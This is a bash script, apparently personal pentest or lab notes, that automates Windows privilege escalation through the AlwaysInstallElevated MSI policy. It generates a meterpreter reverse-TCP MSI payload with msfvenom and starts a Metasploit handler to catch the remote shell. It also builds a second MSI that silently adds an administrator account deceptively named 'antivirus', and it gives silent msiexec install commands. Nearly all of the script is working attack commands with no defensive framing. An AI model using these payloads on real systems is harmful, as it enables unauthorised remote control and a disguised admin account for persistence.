#!/bin/bash

#Priv Esc via msi?? LOLOLOL

#Check reg query install

#Checks for Elevated priv
#reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
#reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

#Payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.220 LPORT=4567 -f msi > /home/UserA/Desktop/payloadA.msi

sleep 10 &

#upload within meterpreter upload /home/UserA/Desktop/payloadA.msi
#execute with msiexec /quiet /qn /i payloadA.msi

#set Handler

msfconsole -q -x "use exploit/multi/handler; set LHOST 172.16.220.129; set LPORT 4567; set PAYLOAD windows/meterpreter/reverse_tcp; set ExitOnSession false; exploit -j"

#Generates windows/exec creates user with admin access (:
msfvenom -p windows/exec CMD='net localgroup administrators antivirus /add' -f msi > /home/UserA/Desktop/payloadA0.msi

#upload to desktop

#upload /home/UserA/Desktop/payloadA0.msi

#shell into > msiexec /quiet /qn /i payloadA0.msi

#Could Also use built in exploit??

# use exploit/windows/local/always_install_elevated
# msf exploit(always_install_elevated) > set session 1
# msf exploit(always_install_elevated) > exploit

